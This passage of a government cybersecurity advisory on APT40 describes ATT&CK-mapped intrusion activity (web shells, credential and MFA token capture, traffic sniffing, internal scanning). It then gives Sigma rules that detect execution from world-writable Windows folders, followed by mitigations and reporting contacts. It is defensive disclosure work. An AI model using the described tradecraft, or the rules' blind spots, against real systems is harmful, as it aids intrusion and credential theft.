<p><a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a>&nbsp;Server&nbsp;Software&nbsp;Component:&nbsp;Web Shell</p>
<p>Actors deployed several web shells on the affected appliance. It is possible that multiple distinct actors deployed&nbsp;web&nbsp;shells,&nbsp;but&nbsp;that&nbsp;only&nbsp;a&nbsp;smaller&nbsp;number&nbsp;of&nbsp;actors conducted activity using these web shells.</p>
<p>Web&nbsp;shells&nbsp;would&nbsp;have&nbsp;allowed&nbsp;for&nbsp;arbitrary&nbsp;command&nbsp;execution by the actor on the compromised appliances.</p>
<h3>Privilege&nbsp;escalation</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1068\" title=\"Exploitation for Privilege Escalation\">T1068</a>&nbsp;Exploitation&nbsp;for Privilege&nbsp;Escalation</p>
<p>Available evidence does not describe the level of privilege attained by actors. However, using web shells, the actors would have achieved a level of privilege&nbsp;comparable&nbsp;to&nbsp;that&nbsp;of&nbsp;the&nbsp;web&nbsp;server&nbsp;on&nbsp;the&nbsp;compromised appliance. Vulnerabilities believed to have been present on the compromised appliance</p>
<p>would&nbsp;have&nbsp;allowed&nbsp;the&nbsp;actors&nbsp;to&nbsp;attain&nbsp;root&nbsp;privileges.</p>
<h3>Credential&nbsp;access</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1056/003\" title=\"Input Capture: Web Portal Capture\">T1056.003</a>&nbsp;Input&nbsp;Capture:&nbsp;Web&nbsp;Portal&nbsp;Capture</p>
<p>Evidence on the compromised appliance showed that the actor had captured several hundred username-password&nbsp;pairs,&nbsp;in&nbsp;clear&nbsp;text,&nbsp;which&nbsp;are believed&nbsp;to&nbsp;be&nbsp;legitimate.&nbsp;It&nbsp;is&nbsp;likely&nbsp;that&nbsp;these&nbsp;were&nbsp;captured&nbsp;using&nbsp;some&nbsp;modification&nbsp;to&nbsp;the&nbsp;genuine authentication&nbsp;process&nbsp;which&nbsp;output&nbsp;the credentials&nbsp;to a&nbsp;file.</p>
<p><a href=\"https://attack.mitre.org/techniques/T1111\" title=\"Multi-Factor Authentication Interception\">T1111</a>&nbsp;Multi-Factor&nbsp;Authentication&nbsp;Interception The&nbsp;actor&nbsp;also&nbsp;captured&nbsp;the&nbsp;value&nbsp;of&nbsp;MFA&nbsp;tokens</p>
<p>corresponding to legitimate logins. These were likely captured by modifying the genuine authentication process to output these values to a file. There is no evidence of compromise of the “secret server’ which stores&nbsp;the&nbsp;unique&nbsp;values&nbsp;that&nbsp;provide&nbsp;for&nbsp;the&nbsp;security&nbsp;of&nbsp;MFA&nbsp;tokens.</p>
<p><a href=\"https://attack.mitre.org/techniques/T1040\" title=\"Network Sniffing\">T1040</a>&nbsp;Network&nbsp;Sniffing</p>
<p>The actor is believed to have captured JWTs by capturing HTTP traffic on the compromised appliance. There&nbsp;is&nbsp;evidence&nbsp;that&nbsp;the&nbsp;utility&nbsp;tcpdump&nbsp;was&nbsp;executed on the compromised appliance, which may have been how the actor captured these JWTs.</p>
<p><a href=\"https://attack.mitre.org/techniques/T1539\" title=\"Steal Web Session Cookie\">T1539</a>&nbsp;Steal&nbsp;Web Session&nbsp;Cookie</p>
<p>As&nbsp;described&nbsp;above,&nbsp;the&nbsp;actor&nbsp;captured&nbsp;JWTs,&nbsp;which&nbsp;are&nbsp;analogous to web session cookies. These could have been reused by the actor to establish further access.</p>
<h3>Discovery</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1046\" title=\"Network Service Discovery\">T1046</a>&nbsp;Network Service&nbsp;Discovery</p>
<p>There&nbsp;is&nbsp;evidence&nbsp;that&nbsp;network&nbsp;scanning&nbsp;utility nmap was executed on the compromised appliance to&nbsp;scan other appliances in the same network segment. This was likely used by the actor to discover other reachable network services which might present opportunities for lateral movement.</p>
<h3>Collection</h3>
<p>Available evidence does not reveal how actors collected data or exactly what was collected from the&nbsp;compromised&nbsp;appliance&nbsp;or&nbsp;from&nbsp;other&nbsp;systems. However,&nbsp;it&nbsp;is&nbsp;likely&nbsp;that&nbsp;actors&nbsp;had&nbsp;access&nbsp;to&nbsp;all&nbsp;files&nbsp;on the compromised appliance, including the captured&nbsp;credentials&nbsp;[<a href=\"https://attack.mitre.org/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>],&nbsp;MFA&nbsp;token&nbsp;values&nbsp;[<a href=\"https://attack.mitre.org/techniques/T1111/\" title=\"Multi-Factor Authentication Interception\">T1111</a>],&nbsp;and&nbsp;JWTs described above.</p>
<h3>Command&nbsp;and&nbsp;Control</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1071/001\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a>&nbsp;Application&nbsp;Layer&nbsp;Protocol:&nbsp;Web&nbsp;Protocols</p>
<p>Actors&nbsp;used&nbsp;web&nbsp;shells&nbsp;for&nbsp;command&nbsp;and&nbsp;control.&nbsp;Web&nbsp;shell commands would have been passed over HTTPS&nbsp;using&nbsp;the&nbsp;existing&nbsp;web&nbsp;server&nbsp;on&nbsp;the appliance&nbsp;[<a href=\"https://attack.mitre.org/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>].</p>
<p><a href=\"https://attack.mitre.org/versions/v15/techniques/T1001/003/\" title=\"Data Obfuscation: Protocol Impersonation\">T1001.003</a>&nbsp;Data&nbsp;Obfuscation:&nbsp;Protocol&nbsp;Impersonation</p>
<p>Actors&nbsp;used&nbsp;compromised&nbsp;devices&nbsp;as&nbsp;a&nbsp;launching&nbsp;point for&nbsp;attacks&nbsp;that&nbsp;are&nbsp;designed&nbsp;to&nbsp;blend&nbsp;in&nbsp;with&nbsp;legitimate&nbsp;traffic.</p>
<h2><strong>Detection&nbsp;and&nbsp;mitigation recommendations</strong></h2>
<p>The&nbsp;ASD’s&nbsp;ACSC&nbsp;strongly&nbsp;recommends&nbsp;implementing&nbsp;the&nbsp;ASD&nbsp;<a href=\"https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight\" title=\"Essential Eight\">Essential&nbsp;Eight</a>&nbsp;Controls&nbsp;and&nbsp;associated&nbsp;<a href=\"https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/strategies-mitigate-cyber-security-incidents/strategies-mitigate-cyber-security-incidents-mitigation-details\" title=\"Strategies&nbsp;to&nbsp;Mitigate&nbsp;Cyber&nbsp;Security&nbsp;Incidents\">Strategies&nbsp;to&nbsp;Mitigate&nbsp;Cyber&nbsp;Security&nbsp;Incidents</a>.&nbsp;Below are recommendations for network security actions that&nbsp;should&nbsp;be&nbsp;taken&nbsp;to&nbsp;detect&nbsp;and&nbsp;prevent&nbsp;intrusions by&nbsp;APT40,&nbsp;followed&nbsp;by&nbsp;specific&nbsp;mitigations&nbsp;for&nbsp;four&nbsp;key&nbsp;TTPs&nbsp;summarized&nbsp;in&nbsp;Table&nbsp;1.</p>
<h3>Detection</h3>
<p>Some of the files identified above were dropped in locations such as C:\\Users\\Public\\* and C:\\Windows\\ Temp\\*.&nbsp;These locations can be convenient spots for writing data as they are usually world writable, that is, all user accounts registered in Windows have access to these directories and their subdirectories. Often, any&nbsp;user&nbsp;can&nbsp;subsequently&nbsp;access&nbsp;these&nbsp;files,&nbsp;allowing opportunities for lateral movement, defense evasion, low-privilege execution and staging for exfiltration.</p>
<p>The&nbsp;following&nbsp;Sigma&nbsp;rules&nbsp;look&nbsp;for&nbsp;execution&nbsp;from suspicious locations as an indicator of anomalous activity.&nbsp;In&nbsp;all&nbsp;instances,&nbsp;subsequent&nbsp;investigation&nbsp;is required&nbsp;to&nbsp;confirm&nbsp;malicious&nbsp;activity&nbsp;and&nbsp;attribution.</p>
<table>
<tbody>
<tr>
<td>
<h5>Title:&nbsp;World&nbsp;Writable&nbsp;Execution&nbsp;-&nbsp;Temp</h5>
<p><strong>ID:&nbsp;</strong>d2fa2d71-fbd0-4778-9449-e13ca7d7505c</p>
<p><strong>Description: </strong>Detect process execution from C:\\ Windows\\Temp.</p>
<p><strong>Background: </strong>This&nbsp;rule&nbsp;looks&nbsp;specifically&nbsp;for&nbsp;execution&nbsp;out&nbsp;of&nbsp;C:\\ Windows\\Temp\\*.&nbsp;Temp&nbsp;is&nbsp;more&nbsp;broadly&nbsp;used&nbsp;by benign applications and thus a lower confidence malicious&nbsp;indicator&nbsp;than&nbsp;execution&nbsp;out&nbsp;of&nbsp;other&nbsp;world&nbsp;writable subdirectories in C:\\Windows.</p>
<p>Removing applications executed by the SYSTEM or NETWORK SERVICE users substantially reduces the quantity of benign activity selected by this rule.</p>
<p>This&nbsp;means&nbsp;that&nbsp;the&nbsp;rule&nbsp;may&nbsp;miss&nbsp;malicious&nbsp;executions&nbsp;at&nbsp;a&nbsp;higher&nbsp;privilege&nbsp;level&nbsp;but&nbsp;it&nbsp;is&nbsp;recommended&nbsp;to use&nbsp;other&nbsp;rules&nbsp;to&nbsp;determine&nbsp;if&nbsp;a&nbsp;user&nbsp;is&nbsp;attempting&nbsp;to elevate privileges to SYSTEM.</p>
<p><strong>Investigation:</strong></p>
<ol>
<li>Examine information directly associated with this file execution, such&nbsp;as&nbsp;the user&nbsp;context,&nbsp;execution integrity level, immediate follow-on activity and images loaded by the file.</li>
<li>Investigate&nbsp;contextual&nbsp;process,&nbsp;network,&nbsp;file and other supporting data on the host to help&nbsp;make&nbsp;an&nbsp;assessment&nbsp;as&nbsp;to&nbsp;whether&nbsp;the&nbsp;activity&nbsp;is&nbsp;malicious.</li>
<li>If&nbsp;necessary&nbsp;attempt&nbsp;to&nbsp;collect&nbsp;a&nbsp;copy&nbsp;of&nbsp;the&nbsp;file&nbsp;for&nbsp;reverse&nbsp;engineering&nbsp;to&nbsp;determine&nbsp;whether&nbsp;it&nbsp;is&nbsp;legitimate.</li>
</ol>
<p><strong>References:</strong></p>
<p><a href=\"https://www.elastic.co/guide/en/security/current/process-execution-from-an-unusual-directory.html\" title=\"Process Execution from an Unusual Directory\">Process Execution from an Unusual Directory</a></p>
<p><strong>Author:&nbsp;</strong>ASD’s ACSC</p>
<p><strong>Date:&nbsp;</strong>2024/06/19</p>
<p><strong>Status:&nbsp;</strong>experimental</p>
<p><strong>Tags:</strong></p>
<ul>
<li>tlp.green</li>
<li>classification.au.official</li>
<li>attack.execution</li>
</ul>
<p><strong>Log&nbsp;Source:</strong></p>
<p>category:&nbsp;process_creation<br>product:&nbsp;windows</p>
<p><strong>Detection:</strong></p>
<p>temp:<br>Image|startswith:&nbsp;'C:\\\\Windows\\\\Temp\\\\'</p>
<p>common_temp_path:<br>Image|re|ignorecase:&nbsp;'C:\\\\Windows\\\\Temp\\\\\\{[a-fA-F0-9]{8}-([a-fA-F0-9]{4}-){3}[a-fA-F0-9]{12}\\}\\\\'</p>
<p>system_user:<br>User:</p>
<ul>
<li>'SYSTEM'</li>
<li>'NETWORK&nbsp;SERVICE'</li>
</ul>
<p>dismhost:</p>
<ul>
<li>Image|endswith: 'dismhost.exe'&nbsp;</li>
</ul>
<p>known_parent:</p>
<ul>
<li>ParentImage|endswith:</li>
<li>'\\\\esif_uf.exe'&nbsp;</li>
<li>'\\\\vmtoolsd.exe'&nbsp;</li>
<li>'\\\\cwainstaller.exe'</li>
<li>'\\\\trolleyexpress.exe'</li>
</ul>
<p>condition: temp and not (common_temp_path or system_user or dismhost or known_parent)</p>
<p><strong>False positives:</strong></p>
<ul>
<li>Allowlist auditing applications have been observed running executables from Temp.</li>
<li>Temp will legitimately contain an array of setup applications and launchers, so it will be worth considering how prevalent this behavior is on a monitored network (and whether or not it can be allowlisted) before deploying this rule.</li>
</ul>
<p><strong>Level:</strong> low</p>
</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>
<h5>Title:&nbsp;World Writable Execution - Non-Temp System Subdirectory</h5>
<p><strong>ID:</strong> 5b187157-e892-4fc9-84fc-aa48aff9f997</p>
<p><strong>Description:</strong> Detect process execution from a world writable location in a subdirectory of the Windows OS install location.</p>
<p><strong>Background:</strong></p>
<p>This rule looks specifically for execution out of world writable directories within C:\\ and particularly C:\\Windows\\*, with the exception of C:\\Windows\\Temp (which is more broadly used by benign applications and thus a lower confidence malicious indicator).</p>
<p>AppData folders are excluded if a file is run as SYSTEM - this is a benign way in which many temporary application files are executed.</p>
<p>After completing an initial network baseline and identifying known benign executions from these locations, this rule should rarely fire.</p>
<p><strong>Investigation:</strong></p>
<ol>
<li>Examine information directly associated with this file execution, such as the user context, execution integrity level, immediate follow-on activity and images loaded by the file.</li>
<li>Investigate contextual process, network, file and other supporting data on the host to help make an assessment as to whether the activity is malicious.</li>
<li>If necessary attempt to collect a copy of the file for reverse engineering to determine whether it is legitimate.</li>
</ol>
<p><strong>References:</strong></p>
<p><a href=\"https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56\" title=\"mattifestation / WorldWritableDirs.txt\">mattifestation / WorldWritableDirs.txt</a><br><a href=\"https://www.elastic.co/guide/en/security/current/process-execution-from-an-unusual-directory.html\" title=\"Process Execution from an Unusual Directory\">Process Execution from an Unusual Directory</a></p>
<p><strong>Author:</strong> ASD’s ACSC</p>
<p><strong>Date:</strong> 2024/06/19</p>
<p><strong>Status:</strong> experimental</p>
<p><strong>Tags:</strong></p>
<ul>
<li>tlp.green</li>
<li>classification.au.official</li>
<li>attack.execution</li>
</ul>
<p><strong>Log source:</strong></p>
<p>category: process_creation<br>product: windows</p>
<p><strong>Detection:</strong></p>
<p>writable_path:<br>Image|contains:</p>
<ul>
<li>':\\\\$Recycle.Bin\\\\'</li>
<li>':\\\\AMD\\\\Temp\\\\'</li>
<li>':\\\\Intel\\\\'</li>
<li>':\\\\PerfLogs\\\\'</li>
<li>':\\\\Windows\\\\addins\\\\'</li>
<li>':\\\\Windows\\\\appcompat\\\\'</li>
<li>':\\\\Windows\\\\apppatch\\\\'</li>
<li>':\\\\Windows\\\\AppReadiness\\\\'</li>
<li>':\\\\Windows\\\\bcastdvr\\\\'</li>
<li>':\\\\Windows\\\\Boot\\\\'</li>
<li>':\\\\Windows\\\\Branding\\\\'</li>
<li>':\\\\Windows\\\\CbsTemp\\\\'</li>
<li>':\\\\Windows\\\\Containers\\\\'</li>
<li>':\\\\Windows\\\\csc\\\\'</li>
<li>':\\\\Windows\\\\Cursors\\\\'</li>
<li>':\\\\Windows\\\\debug\\\\'</li>
<li>':\\\\Windows\\\\diagnostics\\\\'</li>
<li>':\\\\Windows\\\\DigitalLocker\\\\'</li>
<li>':\\\\Windows\\\\dot3svc\\\\'</li>
<li>':\\\\Windows\\\\en-US\\\\'</li>
<li>':\\\\Windows\\\\Fonts\\\\'</li>
<li>':\\\\Windows\\\\Globalization\\\\'</li>
<li>':\\\\Windows\\\\Help\\\\'</li>
<li>':\\\\Windows\\\\IdentityCRL\\\\'</li>
<li>':\\\\Windows\\\\IME\\\\'</li>
<li>':\\\\Windows\\\\ImmersiveControlPanel\\\\'</li>
<li>':\\\\Windows\\\\INF\\\\'</li>
<li>':\\\\Windows\\\\intel\\\\'</li>
<li>':\\\\Windows\\\\L2Schemas\\\\'</li>
<li>':\\\\Windows\\\\LiveKernelReports\\\\'</li>
<li>':\\\\Windows\\\\Logs\\\\'</li>
<li>':\\\\Windows\\\\media\\\\'</li>
<li>':\\\\Windows\\\\Migration\\\\'</li>
<li>':\\\\Windows\\\\ModemLogs\\\\'</li>
<li>':\\\\Windows\\\\ms\\\\'</li>
<li>':\\\\Windows\\\\OCR\\\\'</li>
<li>':\\\\Windows\\\\panther\\\\'</li>
<li>':\\\\Windows\\\\Performance\\\\'</li>
<li>':\\\\Windows\\\\PLA\\\\'</li>
<li>':\\\\Windows\\\\PolicyDefinitions\\\\'</li>
<li>':\\\\Windows\\\\Prefetch\\\\'</li>
<li>':\\\\Windows\\\\PrintDialog\\\\'</li>
<li>':\\\\Windows\\\\Provisioning\\\\'</li>
<li>':\\\\Windows\\\\Registration\\\\CRMLog\\\\'</li>
<li>':\\\\Windows\\\\RemotePackages\\\\'</li>
<li>':\\\\Windows\\\\rescache\\\\'</li>
<li>':\\\\Windows\\\\Resources\\\\'</li>
<li>':\\\\Windows\\\\SchCache\\\\'</li>
<li>':\\\\Windows\\\\schemas\\\\'</li>
<li>':\\\\Windows\\\\security\\\\'</li>
<li>':\\\\Windows\\\\ServiceState\\\\'</li>
<li>':\\\\Windows\\\\servicing\\\\'</li>
<li>':\\\\Windows\\\\Setup\\\\'</li>
<li>':\\\\Windows\\\\ShellComponents\\\\'</li>
<li>':\\\\Windows\\\\ShellExperiences\\\\'</li>
<li>':\\\\Windows\\\\SKB\\\\'</li>
<li>':\\\\Windows\\\\TAPI\\\\'</li>
<li>':\\\\Windows\\\\Tasks\\\\'</li>
<li>':\\\\Windows\\\\TextInput\\\\'</li>
<li>':\\\\Windows\\\\tracing\\\\'</li>
<li>':\\\\Windows\\\\Vss\\\\'</li>
<li>':\\\\Windows\\\\WaaS\\\\'</li>
<li>':\\\\Windows\\\\Web\\\\'</li>
<li>':\\\\Windows\\\\wlansvc\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\Com\\\\dmp\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\FxsTmp\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\Microsoft\\\\Crypto\\\\RSA\\\\MachineKeys\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\Speech\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\spool\\\\PRINTERS\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\spool\\\\SERVERS\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\Tasks_Migrated\\\\Microsoft\\\\Windows\\\\PLA\\\\System\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\Tasks\\\\'</li>
<li>':\\\\Windows\\\\SysWOW64\\\\Com\\\\dmp\\\\'</li>
<li>':\\\\Windows\\\\SysWOW64\\\\FxsTmp\\\\'</li>
<li>':\\\\Windows\\\\SysWOW64\\\\Tasks\\\\'</li>
</ul>
<p>appdata:<br>Image|contains:&nbsp;'\\\\AppData\\\\'<br>User:&nbsp;'SYSTEM'<br>condition:&nbsp;writable_path&nbsp;and&nbsp;not&nbsp;appdata</p>
<p><strong>False positives:</strong></p>
<p>Allowlist auditing applications have been observed running executables from these directories.</p>
<p>It is plausible that scripts and administrative tools used in the monitored environment(s) may be located in one of these directories and should be addressed on a case-by-case basis.</p>
<p><strong>Level:</strong> high</p>
</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>
<h5>Title:&nbsp;World Writable Execution - Users</h5>
<p><strong>ID:</strong> 6dda3843-182a-4214-9263-925a80b4c634</p>
<p><strong>Description:</strong> Detect process execution from C:\\Users\\Public\\* and other world writable folders within Users.</p>
<p><strong>Background:</strong></p>
<p>AppData folders are excluded if a file is run as SYSTEM - this is a benign way in which many temporary application files are executed.</p>
<p><strong>Investigation:</strong></p>
<ol>
<li>Examine information directly associated with this file execution, such as the user context, execution integrity level, immediate follow-on activity and images loaded by the file.</li>
<li>Investigate contextual process, network, file and other supporting data on the host to help make an assessment as to whether the activity is malicious.</li>
<li>If necessary attempt to collect a copy of the file for reverse engineering to determine whether it is legitimate.</li>
</ol>
<p><strong>References:</strong></p>
<p><a href=\"https://www.elastic.co/guide/en/security/current/process-execution-from-an-unusual-directory.html\" title=\"Process Execution from an Unusual Directory\">Process Execution from an Unusual Directory</a></p>
<p><strong>Author:</strong> ASD’s ACSC</p>
<p><strong>Date:</strong> 2024/06/19</p>
<p><strong>Status:</strong> experimental</p>
<p><strong>Tags:</strong></p>
<ul>
<li>tlp.green</li>
<li>classification.au.official</li>
<li>attack.execution</li>
</ul>
<p><strong>Log source:</strong></p>
<p>category: process_creation<br>product: windows</p>
<p><strong>Detection:</strong><br>users:<br>Image|contains:</p>
<ul>
<li>':\\\\Users\\\\All Users\\\\'</li>
<li>':\\\\Users\\\\Contacts\\\\'</li>
<li>':\\\\Users\\\\Default\\\\'</li>
<li>':\\\\Users\\\\Public\\\\'</li>
<li>':\\\\Users\\\\Searches\\\\'</li>
</ul>
<p>appdata:<br>Image|contains: '\\\\AppData\\\\'<br>User: 'SYSTEM'<br>condition: users and not appdata</p>
<p><strong>False positives:</strong></p>
<p>It is plausible that scripts and administrative tools used in the monitored environment(s) may be located in Public or a subdirectory and should be addressed on a case-by-case basis.</p>
<p><strong>Level:</strong> medium</p>
</td>
</tr>
</tbody>
</table>
<h3>Mitigations</h3>
<h5>Logging</h5>
<p>During ASD’s ACSC investigations, a common issue that&nbsp;reduces the effectiveness and speed of investigative efforts&nbsp;is&nbsp;a&nbsp;lack&nbsp;of&nbsp;comprehensive&nbsp;and&nbsp;historical&nbsp;logging&nbsp;information&nbsp;across&nbsp;a&nbsp;number&nbsp;of&nbsp;areas&nbsp;including web server request logs, Windows event logs&nbsp;and internet proxy logs.</p>
<p>ASD’s&nbsp;ACSC&nbsp;recommends&nbsp;reviewing&nbsp;and&nbsp;implementing their&nbsp;guidance&nbsp;on&nbsp;<a href=\"https://www.cyber.gov.au/resources-business-and-government/maintaining-devices-and-systems/system-hardening-and-administration/system-monitoring/windows-event-logging-and-forwarding\" title=\"Windows&nbsp;Event&nbsp;Logging&nbsp;and&nbsp;Forwarding\">Windows&nbsp;Event&nbsp;Logging&nbsp;and&nbsp;Forwarding</a>&nbsp;including the configuration files and scripts&nbsp;in the&nbsp;<a href=\"http://www.github.com/Australiancybersecuritycentre/windows_event_logging/\" title=\"Windows Event Logging Repository\">Windows Event Logging Repository</a>&nbsp;and the Information&nbsp;Security&nbsp;Manual’s&nbsp;<a href=\"http://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/ism/cyber-security-guidelines/guidelines-system-monitoring\" title=\"Guidelines&nbsp;for&nbsp;System&nbsp;Monitoring\">Guidelines&nbsp;for&nbsp;System&nbsp;Monitoring</a>, to include centralizing logs and retaining&nbsp;logs for a suitable period.</p>
<h5>Patch&nbsp;Management</h5>
<p>Promptly patch all internet exposed devices and&nbsp;services,&nbsp;including&nbsp;web&nbsp;servers,&nbsp;web&nbsp;applications,&nbsp;and&nbsp;remote access gateways. Consider implementing a centralized patch management system to automate and expedite the process. ASD’s ACSC recommend implementation&nbsp;of&nbsp;the&nbsp;ISM’s&nbsp;<a href=\"http://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/ism/cyber-security-guidelines/guidelines-system-management\" title=\"Guidelines&nbsp;for&nbsp;System&nbsp;Management\">Guidelines&nbsp;for&nbsp;System Management</a>, specifically, the System Patching&nbsp;controls where applicable.</p>
<p>Most exploits utilized by the actor were publicly known and had patches or mitigations available.</p>
<p>Organizations should ensure that security patches or mitigations&nbsp;are&nbsp;applied&nbsp;to&nbsp;internet&nbsp;facing&nbsp;infrastructure within 48 hours, and where possible, use the latest&nbsp;versions&nbsp;of&nbsp;software&nbsp;and&nbsp;operating&nbsp;systems.</p>
<h5>Network&nbsp;Segmentation</h5>
<p>Network segmentation can make it significantly more difficult for adversaries to locate and gain access to an organizations sensitive data. Segment networks to limit or block lateral movement by denying traffic between computers unless required. Important servers such as Active Directory and other authentication servers should only be able to be administered from a limited&nbsp;number of intermediary servers or “jump servers.” These servers should be closely monitored, be well secured&nbsp;and limit which users and devices are able to connect to&nbsp;them.</p>
<p>Regardless of instances identified where lateral movement is prevented, additional network&nbsp;segmentation&nbsp;could&nbsp;have&nbsp;further&nbsp;limited&nbsp;the amount&nbsp;of&nbsp;data&nbsp;the&nbsp;actors&nbsp;were&nbsp;able&nbsp;to&nbsp;access&nbsp;and&nbsp;extract.</p>
<h5>Additional Mitigations</h5>
<p>The&nbsp;authoring&nbsp;agencies&nbsp;also&nbsp;recommend&nbsp;the&nbsp;following mitigations to combat APT40 and others’ use of the&nbsp;TTPs&nbsp;below.</p>
<ul>
<li>Disable&nbsp;unused&nbsp;or&nbsp;unnecessary&nbsp;network&nbsp;services, ports&nbsp;and&nbsp;protocols.</li>
<li>Use&nbsp;well-tuned&nbsp;Web&nbsp;application&nbsp;firewalls&nbsp;(WAFs) to protect&nbsp;webservers&nbsp;and applications.</li>
<li>Enforce&nbsp;least privilege&nbsp;to limit&nbsp;access to&nbsp;servers,&nbsp;file shares, and other resources.</li>
<li>Use multi-factor authentication (MFA) and managed service accounts to&nbsp;make&nbsp;credentials harder to crack and reuse. MFA should be applied to&nbsp;all&nbsp;internet&nbsp;accessible&nbsp;remote&nbsp;access&nbsp;services,&nbsp;including:
<ul>
<li>Web&nbsp;and&nbsp;cloud-based&nbsp;email;</li>
<li>Collaboration&nbsp;platforms;</li>
<li>Virtual&nbsp;private&nbsp;network&nbsp;connections; and</li>
<li>Remote&nbsp;desktop&nbsp;services.</li>
</ul>
</li>
<li>Replace&nbsp;end-of-life&nbsp;equipment.</li>
</ul>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption>Mitigation Strategies/Techniques</caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>TTP</strong></th>
<th role=\"columnheader\"><strong>Essential&nbsp;Eight&nbsp;Mitigation&nbsp;Strategies</strong></th>
<th role=\"columnheader\"><strong>ISM&nbsp;Controls</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>Initial&nbsp;Access</p>
<p><a href=\"https://attack.mitre.org/techniques/T1190\" title=\"Exploit Public-Facing Application\">T1190</a></p>
<p>Exploitation of Public-Facing Application</p>
</td>
<td>
<ul>
<li>Patch&nbsp;applications</li>
<li>Patch&nbsp;operating&nbsp;systems</li>
<li>Multi-factor&nbsp;authentication</li>
<li>Application&nbsp;control</li>
</ul>
</td>
<td>
<p>ISM-0140</p>
<p>ISM-1698</p>
<p>ISM-1701</p>
<p>ISM-1921</p>
<p>ISM-1876</p>
<p>ISM-1877</p>
<p>ISM-1905</p>
</td>
</tr>
<tr>
<td>
<p>Execution</p>
<p><a href=\"https://attack.mitre.org/techniques/T1059\" title=\"Command and Scripting Interpreter\">T1059</a></p>
<p>Command&nbsp;and&nbsp;Scripting Interpreter</p>
</td>
<td>
<ul>
<li>Application&nbsp;control</li>
<li>Restrict&nbsp;Microsoft&nbsp;Office&nbsp;macros</li>
<li>Restrict&nbsp;administrative&nbsp;privileges</li>
</ul>
</td>
<td>
<p>ISM-0140</p>
<p>ISM-1490</p>
<p>ISM-1622</p>
<p>ISM-1623</p>
<p>ISM-1657</p>
<p>ISM-1890</p>
</td>
</tr>
<tr>
<td>
<p>Persistence</p>
<p><a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a></p>
<p>Server&nbsp;Software Component:&nbsp;Web&nbsp;Shell</p>
</td>
<td>
<ul>
<li>Application&nbsp;Control</li>
<li>Restrict&nbsp;administrative&nbsp;privileges</li>
</ul>
</td>
<td>
<p>ISM-0140</p>
<p>ISM-1246</p>
<p>ISM-1746</p>
<p>ISM-1249</p>
<p>ISM-1250</p>
<p>ISM-1490</p>
<p>ISM-1657</p>
<p>ISM-1871</p>
</td>
</tr>
<tr>
<td>
<p>Initial&nbsp;Access /&nbsp;Privilege Escalation&nbsp;/&nbsp;Persistence</p>
<p><a href=\"https://attack.mitre.org/techniques/T1078/\" title=\"Valid Accounts\">T1078</a></p>
<p>Valid&nbsp;Accounts</p>
</td>
<td>
<ul>
<li>Patch&nbsp;operating&nbsp;systems</li>
<li>Multi-factor&nbsp;authentication</li>
<li>Restrict&nbsp;administrative&nbsp;privileges</li>
<li>Application&nbsp;control</li>
<li>User&nbsp;application&nbsp;hardening</li>
</ul>
</td>
<td>
<p>ISM-0140</p>
<p>ISM-0859</p>
<p>ISM-1546</p>
<p>ISM-1504</p>
<p>ISM-1679</p>
</td>
</tr>
</tbody>
</table>
<p>For additional general detection and mitigation advice, please consult the Mitigations and Detection sections on the MITRE ATT&amp;CK technique web page for each of the techniques identified in the MITRE ATT&amp;CK summary at the end of this advisory.</p>
<h2><strong>Reporting</strong></h2>
<p><strong>Australian organizations:</strong> visit <a href=\"https://www.cyber.gov.au/\" title=\"Australian Signals Directorate’s Australian Cyber Security Centre\">cyber.gov.au</a> or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and to access alerts and advisories.</p>
<p><strong>Canadian organizations:</strong> report incidents by emailing CCCS at <a href=\"mailto:contact@cyber.gc.ca\" title=\"Canadian Reporting\">contact@cyber.gc.ca</a>.</p>
<p><strong>New Zealand organizations:</strong> report cyber security incidents to <a href=\"mailto:incidents@ncsc.govt.nz\" title=\"New Zealand Reporting\">incidents@ncsc.govt.nz</a> or call 04 498 7654.</p>
<p><strong>United Kingdom organizations:</strong> report a significant cyber security incident at <a href=\"https://www.ncsc.gov.uk/section/about-this-website/contact-us\" title=\"United Kingdom Reporting\">National Cyber Security Centre</a> (monitored 24 hours) or, for urgent assistance, call 03000 200 973.</p>
<p><strong>U.S. organizations:</strong> report incidents and anomalous activity to CISA 24/7 Operations Center at <a href=\"mailto:report@cisa.gov\" title=\"Report to CISA\">report@cisa.gov</a> or (888) 282-0870 and/or to the FBI via your local FBI field office, the FBI’s 24/7 CyWatch at (855) 292-3937, or <a href=\"mailto:CyWatch@fbi.gov\" title=\"Report to FBI\">CyWatch@fbi.gov</a>. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.</p>
<h2><strong>Disclaimer</strong></h2>
